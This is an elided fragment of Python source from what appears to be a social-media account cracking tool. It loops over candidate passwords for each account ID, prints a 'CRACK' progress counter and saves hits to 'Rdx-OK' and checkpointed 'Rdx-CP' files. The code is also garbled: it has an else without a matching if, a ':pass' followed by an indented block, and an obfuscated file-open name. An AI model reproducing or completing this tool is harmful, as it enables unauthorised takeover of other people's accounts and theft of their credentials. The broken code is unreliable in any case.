            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    if fl.get("id") in files_cp:pass
                        ...
                        h_cp = "\r %s[%sRdx-CP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                    ...
                    if fl.get("id") in files_ok:pass
                        ...
                        else:print("\r %s[%sRdx-OK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                        self.ada.append("%s•%s"%(fl.get("id"),i));_azimvau_dapunta_(files_ok,"a+").write("%s•%s\n"%(fl.get("id"),i));break
                else:continue
            self.ko+=1
            print("\r %s[%sCRACK%s][%s%s/%s%s][%sKachi-OK:%s%s][%sRdx-CP:%s%s]%s"%(K,H,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
...
def started():
    ...
    print('%s [%s•%s] %s[%sKachi-OK%s] IDS SAVED IN >> %sRdx-OK/%s.txt'%(H,B,H,O,H,O,H,tanggal))
    print('%s [%s•%s] %s[%sKachi-CP%s] IDS SAVED IN >> %sRdx-CP/%s.txt'%(H,K,H,O,M,O,M,tanggal))
